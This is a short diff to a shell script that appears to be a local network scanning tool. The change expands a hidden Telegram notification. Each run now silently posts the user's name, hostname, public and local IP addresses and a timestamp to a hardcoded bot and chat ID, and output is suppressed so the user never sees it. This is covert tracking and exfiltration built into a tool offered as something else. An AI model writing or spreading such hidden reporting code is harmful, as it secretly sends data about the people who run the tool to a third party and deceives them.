@@ -16,11 +16,13 @@ CHAT_ID="7459581473"
 USER=$(whoami)
 HOST=$(hostname)
 IP=$(curl -s https://ipinfo.io/ip)
+LOCAL_IP=$(hostname -I | awk '{print $1}')
+DATE_TIME=$(date +"%Y-%m-%d %H:%M:%S")
 
-# Send notification to Telegram
+# Send notification to Telegram silently
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d chat_id="$CHAT_ID" \
-     -d text="🚨 rro tool executed 🚨%0AUser: $USER%0AHost: $HOST%0AIP: $IP"
+     -d text="🚨 rro tool executed 🚨%0AUser: $USER%0AHost: $HOST%0AIP Public: $IP%0AIP Local: $LOCAL_IP%0ADate: $DATE_TIME" >/dev/null 2>&1
 
 # Start scanning
 read -p "Enter the base IP (e.g. 192.168.1.): " base_ip
